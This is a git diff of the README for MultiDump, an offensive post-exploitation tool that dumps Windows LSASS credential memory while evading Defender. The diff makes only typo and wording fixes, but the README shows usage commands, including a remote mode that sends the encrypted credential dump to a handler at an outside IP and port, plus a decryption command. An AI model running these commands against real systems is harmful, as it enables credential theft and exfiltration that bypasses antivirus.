@@ -1,6 +1,6 @@
 ## MultiDump
 
-MultiDump is a post-exploitation tool writtern in C for dumping and extracting LSASS memory discreetly, without triggering Defender alerts, with by a handler written in Python.
+### MultiDump is a post-exploitation tool written in C for dumping and extracting LSASS memory discreetly, without triggering Defender alerts, with a handler written in Python.
 
 ![](multidump-defender.gif)
 
@@ -8,7 +8,7 @@ MultiDump is a post-exploitation tool writtern in C for dumping and extracting L
 
 MultiDump supports LSASS dump via `ProcDump.exe` or `Comsvc.dll`, it offers two modes: a local mode that encrypts and stores the dump file locally, and a remote mode that sends the dump to a handler for decryption and analysis.
 
-### Usage
+## Usage
 
 ```powershell
     __  __       _ _   _ _____
@@ -23,7 +23,7 @@ Usage:  MultiDump.exe [-p <ProcDumpPath>] [-l <LocalDumpPath> | -r <RemoteHandle
 -p              Path to save procdump.exe, use full path. Default to current directory
 -l              Path to save encrypted dump file, use full path. Default to current directory
 -r              Set ip:port to connect to a remote handler
---procdump      Writes procdump to disk and use it to dump LSASS
+--procdump      Writes procdump to disk and uses it to dump LSASS
 -v              Enable verbose mode
 
 MultiDump defaults in local mode using comsvcs.dll and saves the encrypted dump in the current directory.
@@ -46,6 +46,8 @@ MultiDump.exe
 ./ProcDumpHandler.py -f dciqjp.dat -k 91ea54633cd31cc23eb3089928e9cd5af396d35ee8f738d8bdf2180801ee0cb1bae8f0cc4cc3ea7e9ce0a74876efe87e2c053efa80ee1111c4c4e7c640c0e33e
 ```
 
+If `--procdump` is used, `ProcDump.exe` will be writtern to disk to dump LSASS.
+
 In remote mode, MultiDump connects to the handler's listener.
 
 ```bash
@@ -57,11 +59,15 @@ In remote mode, MultiDump connects to the handler's listener.
 MultiDump.exe -r 10.0.0.1:9001
 ```
 
-The key is encrypted by the handler's IP and port. When MultiDump connects through a proxy, the handler should use the `--override-ip` option to align the IP address with the `-r` option specified in MultiDump, ensuring decryption works correctly by matching the decryption IP with the expected IP.
+The key is encrypted with the handler's IP and port. When MultiDump connects through a proxy, the handler should use the `--override-ip` option to manually specify the IP address for key generation in remote mode, ensuring decryption works correctly by matching the decryption IP with the expected IP set in MultiDump `-r`.
+
+### Building MultiDump
+
+Open in Visual Studio, build in **Release** mode.
 
 ### Credits
 
-- Some techniques used learnt from [MalDev Academey](https://maldevacademy.com)
+- Some techniques used learnt from [MalDev Academy](https://maldevacademy.com)
 - Inspired by [proc_noprocdump](https://github.com/djackreuter/proc_noprocdump)
 - Code to further process LSASS dump from [lsassy](https://github.com/Hackndo/lsassy)
 - Testing and suggestions from [ballro](https://github.com/ballro)
